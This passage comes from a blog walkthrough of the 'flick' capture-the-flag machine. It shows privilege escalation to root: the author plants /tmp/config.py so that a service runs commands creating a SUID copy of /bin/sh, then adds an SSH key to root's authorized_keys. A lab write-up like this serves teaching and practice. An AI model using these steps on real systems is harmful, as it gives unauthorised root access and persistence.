+# Debugging purposes only!!!
+if os.path.isfile('/tmp/config.py'):
+    sys.path.insert(0, '/tmp')
+else:
+    sys.path.insert(0, '/etc')
+</code></pre>
+
+<p>Fortunately, that file is word-reable, so we can take a peak.</p>
+
+<pre><code class="language-text">robin@flick:~$ cat /etc/config.py
+config = {
+    'command': 'service apache2 restart'
+}
+</code></pre>
+
+<p>So all we require is to create <code>/tmp/config.py</code> and populate it with our own commands.  I opted to make a copy of <code>/bin/sh</code> and set the SUID bit for root.</p>
+
+<pre><code class="language-python">/tmp/config.py
+config = {
+        'command': 'cp /bin/sh /tmp/shell; chmod 4777 /tmp/shell'
+}
+</code></pre>
+
+<p>So when <code>restart.sh</code> is run, it executes supervisor, which also starts the python service on 8881.  When the correct password is entered, instead of starting the apache service on port 80, it will execute our custom commands.</p>
+
+<pre><code class="language-text">robin@flick:~$ ls -l /tmp/ 
+-rwsrwxrwx 1 root  root  109768 Aug 16 20:52 shell
+  
+robin@flick:~$ /tmp/shell 
+# id; whoami
+uid=1000(robin) gid=1000(robin) euid=0(root) groups=0(root),999(docker),1000(robin)
+root
+</code></pre>
+
+<h2 id="game-over:349ad66c7b20ba925d9eeb00398f8306">Game Over</h2>
+
+<p>Before collecting the flag, I echo&rsquo;d my public SSH key into root&rsquo;s authorised_keys, set the correct owners, permissions etc and logged in as root.</p>
+
+<pre><code class="language-text">root@flick:~# ls -l /root/
+total 8
+drwxr-xr-x 2 root root 4096 Aug  1 16:53 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
+-rw-r--r-- 1 root root   67 Aug  1 16:52 flag.txt
+  
+root@flick:~# cat /root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt 
+Congrats!
+  
+You have completed 'flick'! I hope you have enjoyed doing it as much as I did creating it :)
+  
+ciao for now!
+@leonjza
+</code></pre>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2014  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
